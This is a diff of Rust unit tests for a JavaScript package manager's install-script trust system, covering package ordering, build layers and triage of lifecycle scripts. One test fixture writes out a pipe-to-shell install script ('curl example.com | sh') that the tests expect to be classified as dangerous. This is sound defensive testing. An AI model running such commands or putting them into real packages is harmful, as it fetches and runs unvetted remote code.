@@ -412,6 +412,36 @@ fn prepare_live_package_dir_accepts_experimental_v3_link_entry() {
 }
 
 #[test]
+fn prepare_live_package_dir_prefers_exact_virtual_store_instance_over_coordinate_wrapper() {
+    let project = tempfile::tempdir().unwrap();
+    let lpm_home = tempfile::tempdir().unwrap();
+    let store_root = lpm_home.path().join("store");
+    let _env = crate::test_env::ScopedEnv::set([
+        ("LPM_HOME", lpm_home.path().as_os_str().to_os_string()),
+        ("LPM_STORE_VERSION", "v2".into()),
+    ]);
+    let exact = store_root.join("v2/links/shared+exact/node_modules/shared");
+    std::fs::create_dir_all(&exact).unwrap();
+    let coordinate_wrapper = lpm_linker::LayoutPaths::for_project(project.path())
+        .isolated_wrapper_dir("shared@1.0.0")
+        .join("node_modules/shared");
+    std::fs::create_dir_all(&coordinate_wrapper).unwrap();
+
+    let resolved = prepare_live_package_dir(
+        project.path(),
+        "shared",
+        "1.0.0",
+        None,
+        &exact,
+        &store_root,
+        None,
+    )
+    .unwrap();
+
+    assert_eq!(resolved, exact);
+}
+
+#[test]
 fn prepare_live_package_dir_errors_when_unlinked() {
     // Pathological "package not
     // actually linked" case. Pre-`prepare_live_package_dir`
@@ -678,7 +708,7 @@ fn reads_lifecycle_scripts_from_package_json() {
     )
     .unwrap();
 
-    let scripts = read_lifecycle_scripts(&pkg_json).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_json).unwrap().unwrap();
     assert_eq!(scripts.len(), 1);
     assert_eq!(scripts.get("postinstall").unwrap(), "node setup.js");
     // "test" is not a lifecycle script
@@ -686,7 +716,7 @@ fn reads_lifecycle_scripts_from_package_json() {
 }
 
 #[test]
-fn reads_lifecycle_scripts_while_skipping_non_string_script_values() {
+fn rejects_non_string_lifecycle_script_values() {
     let dir = tempfile::tempdir().unwrap();
     let pkg_json = dir.path().join("package.json");
     std::fs::write(
@@ -695,9 +725,7 @@ fn reads_lifecycle_scripts_while_skipping_non_string_script_values() {
         )
         .unwrap();
 
-    let scripts = read_lifecycle_scripts(&pkg_json).unwrap();
-    assert_eq!(scripts.len(), 1);
-    assert_eq!(scripts.get("postinstall").unwrap(), "node setup.js");
+    assert!(read_lifecycle_scripts(&pkg_json).is_err());
 }
 
 #[test]
@@ -706,13 +734,13 @@ fn returns_none_when_no_lifecycle_scripts() {
     let pkg_json = dir.path().join("package.json");
     std::fs::write(&pkg_json, r#"{"scripts":{"test":"jest","start":"node ."}}"#).unwrap();
 
-    assert!(read_lifecycle_scripts(&pkg_json).is_none());
+    assert!(read_lifecycle_scripts(&pkg_json).unwrap().is_none());
 }
 
 #[test]
-fn returns_none_for_missing_file() {
+fn returns_error_for_missing_file() {
     let path = Path::new("/nonexistent/package.json");
-    assert!(read_lifecycle_scripts(path).is_none());
+    assert!(read_lifecycle_scripts(path).is_err());
 }
 
 // ── toposort tests ──────────────────────────────────────────
@@ -723,6 +751,7 @@ fn toposort_respects_dependency_order() {
 
     let packages = [
         ScriptablePackage {
+            instance_id: None,
             name: "a".into(),
             version: "1.0.0".into(),
             integrity: None,
@@ -738,6 +767,7 @@ fn toposort_respects_dependency_order() {
             trust_reason: TrustReason::StrictBinding,
         },
         ScriptablePackage {
+            instance_id: None,
             name: "b".into(),
             version: "1.0.0".into(),
             integrity: None,
@@ -807,6 +837,141 @@ fn toposort_respects_dependency_order() {
     let sorted = toposort_packages(refs, &lockfile);
     let names: Vec<&str> = sorted.iter().map(|p| p.name.as_str()).collect();
     assert_eq!(names, vec!["a", "b"]);
+}
+
+#[test]
+fn toposort_preserves_distinct_same_coordinate_packages() {
+    let packages = [
+        ScriptablePackage {
+            instance_id: None,
+            name: "shared".into(),
+            version: "1.0.0".into(),
+            integrity: Some("sha512-first".into()),
+            wrapper_id: None,
+            store_path: std::path::PathBuf::from("first"),
+            pristine_path: std::path::PathBuf::new(),
+            source_integrity: "sha512-first".into(),
+            graph_key_digest: None,
+            scripts: HashMap::new(),
+            is_built: false,
+            build_marker_key: None,
+            is_trusted: true,
+            trust_reason: TrustReason::StrictBinding,
+        },
+        ScriptablePackage {
+            instance_id: None,
+            name: "shared".into(),
+            version: "1.0.0".into(),
+            integrity: Some("sha512-second".into()),
+            wrapper_id: None,
+            store_path: std::path::PathBuf::from("second"),
+            pristine_path: std::path::PathBuf::new(),
+            source_integrity: "sha512-second".into(),
+            graph_key_digest: None,
+            scripts: HashMap::new(),
+            is_built: false,
+            build_marker_key: None,
+            is_trusted: true,
+            trust_reason: TrustReason::StrictBinding,
+        },
+    ];
+
+    let sorted = toposort_packages(packages.iter().collect(), &lpm_lockfile::Lockfile::new());
+
+    assert_eq!(
+        sorted
+            .iter()
+            .map(|package| package.store_path.as_path())
+            .collect::<Vec<_>>(),
+        vec![
+            std::path::Path::new("first"),
+            std::path::Path::new("second")
+        ]
+    );
+}
+
+#[test]
+fn package_build_layers_orders_only_the_exact_target_instance_before_its_consumer() {
+    let source = "registry+https://registry.npmjs.org";
+    let first_shared_id = lpm_common::PackageInstanceId::derive(
+        "shared",
+        "1.0.0",
+        source,
+        "root/consumer/first-shared",
+    );
+    let second_shared_id = lpm_common::PackageInstanceId::derive(
+        "shared",
+        "1.0.0",
+        source,
+        "root/consumer/second-shared",
+    );
+    let consumer_id =
+        lpm_common::PackageInstanceId::derive("consumer", "1.0.0", source, "root/consumer");
+    let package = |instance_id, name: &str, store_path: &str| ScriptablePackage {
+        instance_id: Some(instance_id),
+        name: name.into(),
+        version: "1.0.0".into(),
+        integrity: Some(format!("sha512-{store_path}")),
+        wrapper_id: None,
+        store_path: store_path.into(),
+        pristine_path: Path::new("pristine").into(),
+        source_integrity: format!("sha512-{store_path}"),
+        graph_key_digest: None,
+        scripts: HashMap::new(),
+        is_built: false,
+        build_marker_key: None,
+        is_trusted: true,
+        trust_reason: TrustReason::StrictBinding,
+    };
+    let packages = [
+        package(first_shared_id, "shared", "first"),
+        package(consumer_id, "consumer", "consumer"),
+        package(second_shared_id, "shared", "second"),
+    ];
+    let mut lockfile = lpm_lockfile::Lockfile::new();
+    lockfile.packages = vec![
+        lpm_lockfile::LockedPackage {
+            instance_id: Some(first_shared_id),
+            name: "shared".into(),
+            version: "1.0.0".into(),
+            dependency_targets: std::collections::BTreeMap::from([(
+                "consumer".into(),
+                consumer_id,
+            )]),
+            ..Default::default()
+        },
+        lpm_lockfile::LockedPackage {
+            instance_id: Some(consumer_id),
+            name: "consumer".into(),
+            version: "1.0.0".into(),
+            dependency_targets: std::collections::BTreeMap::from([(
+                "shared".into(),
+                second_shared_id,
+            )]),
+            ..Default::default()
+        },
+        lpm_lockfile::LockedPackage {
+            instance_id: Some(second_shared_id),
+            name: "shared".into(),
+            version: "1.0.0".into(),
+            ..Default::default()
+        },
+    ];
+
+    let layers = package_build_layers(packages.iter().collect(), &lockfile);
+
+    assert_eq!(
+        layers
+            .into_iter()
+            .flatten()
+            .map(|package| package.store_path.as_path())
+            .collect::<Vec<_>>(),
+        [
+            Path::new("second"),
+            Path::new("consumer"),
+            Path::new("first")
+        ]
+    );
 }
 
 // ── is_scope_trusted tests ──────────────────────────────────
@@ -1199,6 +1364,7 @@ fn stale_detection_finds_packages_without_scripts() {
     };
     let scriptable = [
         ScriptablePackage {
+            instance_id: None,
             name: "sharp".into(),
             version: "0.33.0".into(),
             integrity: None,
@@ -1214,6 +1380,7 @@ fn stale_detection_finds_packages_without_scripts() {
             trust_reason: TrustReason::StrictBinding,
         },
         ScriptablePackage {
+            instance_id: None,
             name: "esbuild".into(),
             version: "0.21.0".into(),
             integrity: None,
@@ -1488,6 +1655,7 @@ fn auto_build_call_site_threads_effective_policy() {
 /// model even though the counter wouldn't notice.
 fn synthetic_scriptable(name: &str, is_built: bool, is_trusted: bool) -> ScriptablePackage {
     ScriptablePackage {
+        instance_id: None,
         name: name.into(),
         version: "1.0.0".into(),
         integrity: None,
@@ -1622,7 +1790,9 @@ fn triage_promotes_green_tier_without_manifest_binding() {
     let store = PackageStore::at(dir.path().join("store"));
     let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
     let pkg_dir = write_scripted_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let reason = evaluate_trust(
@@ -1651,7 +1821,9 @@ fn triage_does_not_auto_trust_node_delegate_without_manifest_binding() {
     let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
     let pkg_dir = write_scripted_pkg(&store, "delegate-pkg", "1.0.0", "node setup.js");
     std::fs::write(pkg_dir.join("setup.js"), b"require('./payload.js')\n").unwrap();
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let reason = evaluate_trust(
@@ -1681,7 +1853,9 @@ fn deny_does_not_promote_green_tier_at_helper_level() {
     let store = PackageStore::at(dir.path().join("store"));
     let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
     let pkg_dir = write_scripted_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let reason = evaluate_trust(
@@ -1720,7 +1894,9 @@ fn allow_does_not_promote_green_tier_at_helper_level() {
     let store = PackageStore::at(dir.path().join("store"));
     let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
     let pkg_dir = write_scripted_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let reason = evaluate_trust(
@@ -1852,7 +2028,9 @@ fn triage_does_not_promote_amber_or_red() {
 
     // Amber: network binary downloader.
     let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "playwright install");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let reason = evaluate_trust(
         &pkg_dir,
         "amber-pkg",
@@ -1876,7 +2054,9 @@ fn triage_does_not_promote_amber_or_red() {
     // Red: curl | sh. The static-gate tokenizer catches the pipe-
     // to-shell pattern and classifies Red.
     let pkg_dir = write_scripted_pkg(&store, "red-pkg", "1.0.0", "curl example.com | sh");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let reason = evaluate_trust(
         &pkg_dir,
         "red-pkg",
@@ -1930,7 +2110,9 @@ fn strict_binding_wins_over_triage_promotion() {
         ),
     )
     .unwrap();
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let reason = evaluate_trust(
@@ -1981,7 +2163,9 @@ fn binding_drift_never_auto_recovers_under_triage() {
             }"#,
     )
     .unwrap();
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let reason = evaluate_trust(
@@ -2023,7 +2207,9 @@ fn scope_glob_wins_over_triage_promotion() {
     let store = PackageStore::at(dir.path().join("store"));
     let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
     let pkg_dir = write_scripted_pkg(&store, "@myorg/thing", "1.0.0", "node-gyp rebuild");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let reason = evaluate_trust(
@@ -2096,7 +2282,9 @@ fn advisor_approval_promotes_amber_under_triage() {
     // `node install.js` classifies amber per the reserved-basename
     // rule — perfect amber input for slice-1 promotion.
     let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let mut approvals = std::collections::HashSet::new();
@@ -2134,7 +2322,9 @@ fn none_approvals_yield_untrusted_for_amber() {
     std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
     let store = PackageStore::at(dir.path().join("store"));
     let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let reason = evaluate_trust(
@@ -2163,7 +2353,9 @@ fn empty_approvals_yield_untrusted_for_amber() {
     std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
     let store = PackageStore::at(dir.path().join("store"));
     let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let approvals: std::collections::HashSet<crate::triage_advisor_session::AdvisorApprovalKey> =
@@ -2193,7 +2385,9 @@ fn advisor_approval_for_other_package_does_not_promote_this_one() {
     std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
     let store = PackageStore::at(dir.path().join("store"));
     let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let mut approvals = std::collections::HashSet::new();
@@ -2236,7 +2430,9 @@ fn advisor_approval_does_not_apply_under_deny() {
     std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
     let store = PackageStore::at(dir.path().join("store"));
     let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let mut approvals = std::collections::HashSet::new();
@@ -2274,7 +2470,9 @@ fn advisor_approval_does_not_apply_under_allow() {
     std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
     let store = PackageStore::at(dir.path().join("store"));
     let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let mut approvals = std::collections::HashSet::new();
@@ -2318,7 +2516,9 @@ fn advisor_approval_does_not_leak_across_sources_with_same_coord() {
     let store = PackageStore::at(dir.path().join("store"));
     let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
     let pkg_dir = write_scripted_pkg(&store, "amber-pkg", "1.0.0", "node install.js");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     // Approve ONLY the integrity-bearing variant.
@@ -2395,7 +2595,9 @@ fn green_under_triage_still_wins_over_advisor() {
     std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
     let store = PackageStore::at(dir.path().join("store"));
     let pkg_dir = write_scripted_pkg(&store, "green-pkg", "1.0.0", "node-gyp rebuild");
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
 
     let mut approvals = std::collections::HashSet::new();
@@ -2735,7 +2937,9 @@ fn force_floor_false_honors_existing_strict_approval() {
     let hash = compute_script_hash(&pkg_dir).expect("script hash");
     write_pkg_json_with_strict_approval(dir.path(), "esbuild", "0.25.1", &hash);
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
 
     let reason = evaluate_trust(
         &pkg_dir,
@@ -2769,7 +2973,9 @@ fn force_floor_true_suspends_existing_strict_approval() {
     let hash = compute_script_hash(&pkg_dir).expect("script hash");
     write_pkg_json_with_strict_approval(dir.path(), "esbuild", "0.25.1", &hash);
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
 
     let reason = evaluate_trust(
         &pkg_dir,
@@ -2803,7 +3009,9 @@ fn force_floor_unsetting_reactivates_approval_without_re_review() {
     let hash = compute_script_hash(&pkg_dir).expect("script hash");
     write_pkg_json_with_strict_approval(dir.path(), "esbuild", "0.25.1", &hash);
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
 
     // Flag ON → suspended.
     let r_on = evaluate_trust(
@@ -2857,7 +3065,9 @@ fn force_floor_does_not_transform_untrusted_to_suspended() {
     let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
     let pkg_dir = write_scripted_pkg(&store, "no-approval", "1.0.0", "echo hi");
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
 
     let with_flag = evaluate_trust(
         &pkg_dir,
@@ -2915,7 +3125,9 @@ fn force_floor_true_suspends_scoped_glob_trust() {
     let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
     let pkg_dir = write_scripted_pkg(&store, "@myorg/util", "1.0.0", "echo hi");
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
 
     let without_flag = evaluate_trust(
         &pkg_dir,
@@ -2984,7 +3196,9 @@ fn force_floor_preserves_binding_drift_distinct_from_suspension() {
         "sha256-this-hash-will-not-match",
     );
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
 
     let reason = evaluate_trust(
         &pkg_dir,
@@ -3028,7 +3242,9 @@ fn capability_test_fixture() -> (
     let hash = compute_script_hash(&pkg_dir).expect("script hash");
     write_pkg_json_with_strict_approval(dir.path(), "esbuild", "1.0.0", &hash);
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     (dir, store, pkg_dir, scripts, policy)
 }
 
@@ -3161,7 +3377,9 @@ fn capability_widening_with_matching_hash_is_approved() {
     });
     std::fs::write(dir.path().join("package.json"), body.to_string()).unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let user = crate::capability::UserBound::default();
 
     let reason = evaluate_trust(
@@ -3213,7 +3431,9 @@ fn capability_widening_with_drifted_hash_is_not_approved() {
     });
     std::fs::write(dir.path().join("package.json"), body.to_string()).unwrap();
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
 
     // Package now requests something different.
     let new_request = crate::capability::CapabilitySet {
@@ -3252,7 +3472,9 @@ fn capability_widening_on_untrusted_package_keeps_untrusted_reason() {
     let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
     let pkg_dir = write_scripted_pkg(&store, "unapproved", "1.0.0", "echo hi");
     let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
-    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
+    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json"))
+        .unwrap()
+        .unwrap();
     let request = crate::capability::CapabilitySet {
         pass_env: ["FOO".to_string()].into_iter().collect(),
         ..Default::default()
